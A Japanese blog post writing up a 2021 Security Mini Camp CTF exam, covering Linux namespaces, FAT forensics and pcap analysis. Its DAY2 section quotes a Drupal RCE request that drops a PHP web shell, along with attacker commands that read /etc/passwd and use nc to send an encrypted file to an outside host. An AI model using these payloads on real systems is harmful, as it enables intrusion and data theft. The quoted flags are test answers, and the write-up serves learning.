---
layout: post
title: セキュリティ・ミニキャンプ オンライン 2021 修了試験 writeup
description: これは 2021/10/30(土) から 2021/11/20(土) かけて行われたセキュリティ・ミニキャンプ オンライン 2021 の修了試験の writeup です。
draft: false
changelog:
  - summary: 記事作成
    date: 2021-11-20T10:06:31+00:00
  - summary: hugoにmigrate
    date: 2022-05-25T07:19:22+09:00
---

::: messages notice
これは 2021/10/30(土) から 2021/11/20(土) かけて行われたセキュリティ・ミニキャンプ オンライン 2021 の修了試験の writeup です。
:::

CTF 形式で、全 5 回の講義にまつわる講義がそれぞれ 1 問ずつ、計 5 問(+フラグ提出確認用の一問)が出題され、これを 9 時くらいから 11:30 までの 2 時間 30 分の間で解きました。

私は以下を解きました。

- newbie 1 点
- DAY3 Linux システムプログラミング 20 点
- DAY1 ファイルシステム 20 点
- DAY2 サイバー攻撃対応入門 20 点

このうち newbie はフラグ提出確認用です。

また、以下の問題が解けませんでした。

- DAY3 コンテナセキュリティ
- DAY2 マルウェアのトラフィックを分析・検知してみよう

計 3 問+1 問を解いて、表彰上？1 位と 1.5 位につづき同率 2 位でした。(scoreboard 上では 3 位)

それでは writeup の内容に移ります。

# newbie

フラグが問題文に書いていて、提出してくださいという問題。提出確認用でした。

# DAY3 Linux システムプログラミング

ssh した先の環境である実行ファイルをある環境のもと実行せよという問題でした。
具体的には

- `/try_running_me` という実行ファイルを、第 0 引数を `"" (empty string)` として、root で実行する

というものでした。

## 時間中にやったこと

まず `ls` して出てきた `README` のメッセージに従って `/try_running_me` を実行してみます。

```
$ /try_running_me
oops!
run this binary with setting 0-th argument to "" (empty string)
```

えっ `argv[0]` って空文字列に変更できるんですか...？`/proc`系をはじめ疑っていたのですが、落ち着いて講義を思い出すとおぼろげながらファイルを実行するときに実行パスを`argv`に入れた気がしてきました～～～！
ここで講義の事前課題 2 で書いた C のソースコードを見返すと、こんな感じになっています。

```c
int child(struct child_process* p){
        char* path = p->binary;
        char* arg[] = {path, NULL};
        char* env[] = {NULL};
        dup2(p->fd[1], STDOUT_FILENO);
        execve(path, arg, env);
        return 0;
}
```

これもしかして

```c
char* arg[] = {"", NULL};
```

に変更すれば勝てるのでは？SSH 環境下なので C を書いて gcc も入っていたのでコンパイルします。

ソースコードは以下のようになっています。

```c
#define _GNU_SOURCE
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdio.h>

#define OUTPUT_BUFFER_SIZE 1024

struct child_process{
        void* binary;
        int* fd;
};

int child(struct child_process* p){
        char* path = p->binary;
        char* arg[] = {"", NULL};
        char* env[] = {NULL};
        dup2(p->fd[1], STDOUT_FILENO);
        execve(path, arg, env);
        return 0;
}

int execute_binary(const char* const binary, char* const buffer, const size_t bufsize) {
        int p[2];
        if (pipe(p) == -1) {
                fprintf(stderr, "pipe failed\n");
                return -1;
        }
        struct child_process process;
        process.binary = (void *)binary;
        process.fd = &p[0];
        //puts("child_process done");

        void* stack = mmap(NULL, 1024*1024,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_STACK,-1,0);
        pid_t c = clone((void *)child, stack + 1024*1024, SIGCHLD, &process);
        if (c == -1) {
                fprintf(stderr, "clone failed\n");
                return -1;
        }
        waitpid(c, NULL, 0);
        //puts("wait done");
        ssize_t sz = read(process.fd[0], buffer, bufsize);
        if (sz < 0) {
                fprintf(stderr, "read failed\n");
                return -1;
        }
        //puts("sz ok");
        return sz;
}

int main(){
        char buf[OUTPUT_BUFFER_SIZE] = {0};
        int r = execute_binary("/try_running_me", buf, OUTPUT_BUFFER_SIZE-1);

        if (r >= 0) {
                buf[r] = '\0';
                printf("read %d bytes\n%s\n", r, buf);
        } else {
                printf("error %d\n", r);
        }
}
```

すると、なにやら違うメッセージが出てきました。

```
you're half way there!
run this binary as root. note that you should keep 0-th argument ""
```

どうやらこのまま root で実行せよとのことです。 `sudo` は入っていない環境でした。

これも講義でやったな！と思い、講義のファイルから必要のないネットワーク部分だけ削除やコメントアウトしてみます。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define STR_BUF_SIZE 1024
#define SHELL_PATH "/bin/bash"

int chroot_dir(const char*const path) {
        if (chroot(path) != 0) return -1;
        if (chdir("/") != 0) return -1;
        return 0;
}



int exec_command_child(char* cmd) {
        char* const argv[] = {SHELL_PATH, "-c", cmd, NULL};
        char* const envp[] = {NULL};
        execve(SHELL_PATH, argv, envp);
        return -1;

}

int exec_command(const char* const cmd) {
        char* stack = mmap(NULL,1024*1024,PROT_READ|PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_STACK,-1,0);
        if (stack == MAP_FAILED) return -1;
        pid_t child = clone((int (*)(void *))exec_command_child, stack+1024*1024, SIGCHLD, cmd);
        if (child ==-1)return -1;
        if (waitpid(child, NULL,0)==-1)return -1;
        return 0;
}

int parent_install_network(pid_t child) {
        if (exec_command("ip link add vethA type veth peer vethB") == -1)return -1;
        if (exec_command("ip link set dev vethA up") == -1)return -1;
        if (exec_command("ip address add 10.0.0.1/24 dev vethA") == -1)return -1;
        char cmd[STR_BUF_SIZE];
        snprintf(cmd, STR_BUF_SIZE, "ip link set dev vethB netns %d", child);
        exec_command(cmd);
}

int child_install_network() {
        if (exec_command("ip link set dev vethB up") == -1)return -1;
        if (exec_command("ip address add 10.0.0.2/24 dev vethB") == -1)return -1;
        if (exec_command("ip route add default via 10.0.0.1") == -1)return -1;
        return 0;
}

int parent_uninstall_network(){
        if (exec_command("ip link delete vethA") == -1)return -1;

}

typedef struct {
        int fd[2];
} isolated_child_args_t;

int write_file(const char*const path, const char* const str) {
        int fd = open(path, O_WRONLY);
        int len = 0;
        for(len=0;str[len] != '\0';len++);
        if (write(fd, str, len) != len) return -1;
        if (close(fd) == -1) return -1;
        return 0;
}

int write_ug_map(pid_t child) {
        char path[STR_BUF_SIZE], data[STR_BUF_SIZE];
        snprintf(path, STR_BUF_SIZE, "/proc/%d/setgroups", child);
        if (write_file(path, "deny") == -1) return -1;
        snprintf(path, STR_BUF_SIZE, "/proc/%d/gid_map", child);
        snprintf(data, STR_BUF_SIZE, "0 %d 1\n", getgid());
        if (write_file(path, data) == -1) return -1;
        snprintf(path, STR_BUF_SIZE, "/proc/%d/uid_map", child);
        snprintf(data, STR_BUF_SIZE, "0 %d 1\n", getuid());
        if (write_file(path, data) == -1) return -1;
        return 0;
}

int isolated_child(isolated_child_args_t* args) {
        char buf[1];
        if (read(args->fd[0], buf, 1) == -1) return -1;
        //chroot_dir("/home/minicamp/sandbox/linux-c/camp/sysroot-debian-bullseye");

//        child_install_network();


        char* path = "/try_running_me";
        char* arg[] = {"", NULL};
        char* env[] = {NULL};
        execve(path, arg, env);
        return -1;
}

int start_child() {
        isolated_child_args_t args;
        if (pipe(args.fd) == -1) return -1;
        printf("ok: pipe\n");
        void* stack = mmap(NULL,1024*1024,PROT_READ|PROT_WRITE,
                MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_STACK,-1,0);
        if (stack == MAP_FAILED) return -1;
        pid_t c = clone((void *)isolated_child,stack+1024*1024,CLONE_NEWPID|CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD,&args);
        if(c == -1){
                puts("clone failed!\n");
                return -1;
        }
        printf("ok: clone\n");
        if (write_ug_map(c) == -1) return -1;
        printf("ok: map\n");
    //    parent_install_network(c);
        if (write(args.fd[1], "\0", 1) == -1) return -1;
        printf("ok: write to pipe\n");
        if (waitpid(c,NULL,0) == -1)return -1;
  //      parent_uninstall_network();
}

int main() {
        return start_child();
}
```

flag が得られました。

```
hooray! you finally made it!
your flag is: mc2021{y0u_l1nux_h4ck3r}
```

flag: `mc2021{y0u_l1nux_h4ck3r}`

## 講師の方の解説を見て新しく知ったこと

unshare というコマンドがあり、先ほどの第一引数を `""` とする段階の後で、そのバイナリを `main` とすると

```
$ unshare -r ./main
```

として flag を得ることができるというものでした。(実際にやってみるとできて驚きました) `unshare(2)`についてはまだよく分かっていないので後で調べてみたいと思います。コンテナランタイムでも `unshare(2)`を用いて namespace が切られているそうです。

# DAY1 ファイルシステム

sd カードのダンプイメージが与えられ、その中からフラグを発見せよというフォレンジックの問題でした。

## 時間中にやったこと

まず初手 bz2 という拡張子に戸惑いながら、おりゃと `bzip2 -dc campfs.bin.bz2 > campfs.bin` をしました。少し時間が経ってから処理が終わります(4GB ほどあったようです)

初手 `strings campfs.bin | grep mc` などを試みますがうまく行きません。(それはそう) しかし、file をして以下のようなファイルであることは分かりました。

```
campfs.bin: DOS/MBR boot sector, code offset 0x58+2, OEM-ID "MSWIN4.1", sectors/cluster 8, Media descriptor 0xf8, sectors/track 63, heads 255, sectors 8388608 (volumes > 32 MB), FAT (32 bit), sectors/FAT 8184, serial number 0x6e2650fe, label: "MINISECCAMP"
```

label あたりが粋な感じがしてテンションが上がりますね。

ここで講義中、「実際の業務ではこのように手で読むことはほとんどありません。でもいざというときに使えると強い」とあったので、これは時間もないしツールを使ってみた方がいいか！と思いツール探しの旅に出ます。(後から分かったのですがこれは想定解法ではありませんでした。土下座)

「memory dump forensics」と調べると Volatility というツールがよさそうですがインストールして少し使ってみても分かりませんでした。
次に、「FAT recovery github」とかで調べると以下のツールがヒットしました。

https://github.com/Gregwar/fatcat

なんかこれを使うと、

```
$ ./tool/fatcat/build/fatcat campfs.bin -l /
Listing path /
Directory cluster: 2
f 13/11/2021 14:30:52  _DSC0001.JPG                                       c=3 s=6108843 (5.82585M)
f 13/11/2021 14:30:54  _DSC0003.JPG                                       c=1495 s=7188587 (6.85557M)
f 13/11/2021 14:30:58  _DSC0004.JPG                                       c=3251 s=6729569 (6.41782M)
f 13/11/2021 14:33:20  SECRET.ZIP                                         c=4894 s=6064993 (5.78403M)
```

このように SECRET.ZIP が見えます。このあと `r` オプションを用いて SECRET.ZIP を取り出しますが password がかかっていて見れません。きっと JPG の方に password が 3 分割されて書かれているんでしょう！写真を見てみます！

YAMAHA のアンプ？の写真
ルータっぽい写真
桃鉄の画像

password ないやん

というわけで気を取り直して `d` オプションで削除されたファイルを見てみます。

```
$ ./tool/fatcat/build/fatcat campfs.bin -d -l /
Listing path /
Directory cluster: 2
f 13/11/2021 14:30:52  _DSC0001.JPG                                       c=3 s=6108843 (5.82585M)
f 13/11/2021 14:30:54  _DSC0003.JPG                                       c=1495 s=7188587 (6.85557M)
f 13/11/2021 14:30:58  _DSC0004.JPG                                       c=3251 s=6729569 (6.41782M)
f 13/11/2021 14:33:20  SECRET.ZIP                                         c=4894 s=6064993 (5.78403M)
f 13/11/2021 14:40:48  ASSWORD.TXT                                        c=6376 s=272 (272B) d
```

`PASSWORD.TXT` が見えます。これは講義で最初の文字が埋められて欠けてしまうやつで `P` が抜けているんでしょう。FATCAT の FAT Undelete Tutorial にしたがって、以下のようにするとパスワードのヒントを得ます。

```
$ ./tool/fatcat/build/fatcat campfs.bin -r ASSWORD.TXT
! Trying to read a deleted file, enabling deleted mode
SECRET.ZIPのパスワードは "CLUSTER_(開始クラスタ番号)_LOCK" にしてみました。

クラスタ番号は10進数です。
例えば 0x1234 だった場合は 4660 になりますので
CLUSTER_4660_LOCK

がパスワードになっています。
```

今回だと `4894` がクラスタ番号ですね(`c=`)というわけで無事に ZIP のパスワード `CLUSTER_4894_LOCK` が分かりました。
zip を解凍するとフラグが画像に書かれていました。
flag: `ms2021{YOURE_FS_MASTER}`

`FS_MASTER` ではなく Tool master になってしまった...本当にごめんなさい(復習します)

## 講師の方の解説を見て新しく知ったこと

講師の方は真面目に手で解いていたのでうお～申し訳ねえ～と思いながら見ていました。とはいえ講義でやったことをやれば削除されたファイルの復元などはすぐにできそうです。

# DAY2 サイバー攻撃対応入門

任意コード実行がされた攻撃ログを見て持ち出されたデータの中にあるフラグを pcap ファイルから見つける問題でした。

## 時間中にやったこと

これは CTF の Network っぽいなと思いながら http でフィルタをかけて Follow HTTP Stream をして怪しい通信を見つけます。

```
POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoaXNzZXQoJF9QT1NUWydjJ10pKXsgc3lzdGVtKGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUE9TVFsnYyddKSkpOyB9IA==%20|%20base64%20-d%20%3E%20create.php
```

このへんいかにも base64 して create.php に書き込んで shell 張ってます！という感じがしますね！CyberChef で該当部分を decode します。

```php
<?php if(isset($_POST['c'])){ system(base64_decode(str_rot13($_POST['c']))); }
```

rot13 してから base64decode して、それを exec しているようです。攻撃者はおそらくこれを使っているはずなので、この後の通信の `POST /create.php?` の `c=` の後の文字列を rot13 して base64decode していくと、

```
cat /etc/passwd
```

```
openssl aes-256-cbc -e -in flag.txt -out flag.enc -pass pass:change_option_e_to_d_for_decrypt
```

```
nc -w 2 192.168.180.163 1337 < flag.enc
```

が見つかります。1337 ポートの通信が気になります。`tcp.port == 1337`をして、Follow TCP Stream をして、1337 宛ての通信を見てみると、以下のようなデータが出てきます。

```sh
# ascii
Salted__..<....K............ot5.x..SX........~.h.Y..].n....!.!..
# raw
53616c7465645f5fafde3cc7d1ab8e4bda00901bbbe2adc913f09faa6f7435d778fd2e5358a6e5b493f1dcffd37ea4688e5983e05dac6ef4a187f7219f21b00e
```

これのバイナリデータを取ってきて(確か YAML にしたら base64encode されていたのでそれを使った)手元で以下のようにすると flag が書かれたテキストファイルが得られました。

```
openssl aes-256-cbc -d -in flag.enc -out flag -pass pass:change_option_e_to_d_for_decrypt
```

flag: `mc2021{H4PPY_M1N1C4MP_GR4DU4T10N}`

## 講師の方の解説を見て新しく知ったこと

Drupal であることはちらっと見て分かりましたが意識をしていなかったので、Drupal の脆弱性で今回使われているものを調べておこうと思います。

# DAY3 コンテナセキュリティ (解けなかった)

Rego で Gatekeeper 用のポリシーを実装する。SHA-256 ハッシュ値 (例: ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2)で指定されていなければ reject する。

## 時間中にやったこと

他の問題、特に DAY2 マルウェアのトラフィックを分析・検知してみようが一生うまく行かずにつらいなあとなって時間を消費していたので全く見ることができませんでした(ごめんなさい 🙇)

後半で大ヒントが出題されて、正規表現ゲームになっていたので僕もいくつか正規表現を投げました。問題文は大ヒント部分しか読めていないです。(ごめんなさい...)

結果、惜しいところまでは行ったようです。

## 講師の方の解説を見て新しく知ったこと

正規表現だなあという気持ちになったので、正規表現の `.*` と `.+` の違い(0 文字が許されるかどうか)あたり思い出さないとなと思いました。あと SHA256 の Docker Image については大文字アルファベットが使われないんですね(それはそうか)
正規表現、OSS で実装が見えるものについてバイパスされがちみたいな印象があるので Regex Master になって安全な実装ができるようになりたいですね。

# DAY2 マルウェアのトラフィックを分析・検知してみよう (解けなかった)

snort のルールに沿ったパケットを送ってくださいという問題でした。

## 時間中にやったこと

これ snort 使ってパケット送れるのかな、いやこれログ収集ソフトでは？でも snort 使わないと講義習った上でのあれではないしなあと思って snort を一生動かしていました。ログに何も記録されず、おかしいなあと思いながら色々ガチャガチャしていました。たぶん snort を 1 時間くらいは触っていたと思います...

## 講師の方の解説を見て新しく知ったこと

netcat を使って普通に UDP パケットを送信すればよかったようです！！！snort はおそらく講師側で動いていてそれに合うパケットを送って返却されたものがフラッグになっているというものでした！！！かなしい！！！

# 感想

ミニキャンプ修了できた気がしなくて厳しい気持ちになりましたが、楽しめました。とても悔しかったのですがおそらく年齢的に今年 25 でリベンジの機会はなさそうなので、苦手分野のネットワークも、好きな分野の低レイヤもコツコツ精進して行きたいと思います。
講師陣のみなさん、インフラ提供をしてくださった方々、運営事務の方々、ありがとうございました！
